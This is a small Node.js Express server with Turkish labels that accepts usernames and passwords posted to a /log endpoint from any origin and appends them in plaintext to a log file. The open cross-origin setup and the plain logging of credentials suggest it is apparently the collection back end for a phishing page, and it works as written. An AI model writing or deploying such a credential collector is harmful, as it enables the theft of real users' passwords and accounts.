const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

app.use(cors());
app.use(express.json());

app.post("/log", (req, res) => {
    const { username, password } = req.body;
    const log = `[${new Date().toLocaleString()}] Kullanıcı: ${username}, Şifre: ${password}\n`;
    fs.appendFileSync("log.txt", log, "utf8");
    res.status(200).send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Sunucu çalışıyor: ${PORT}`);
});
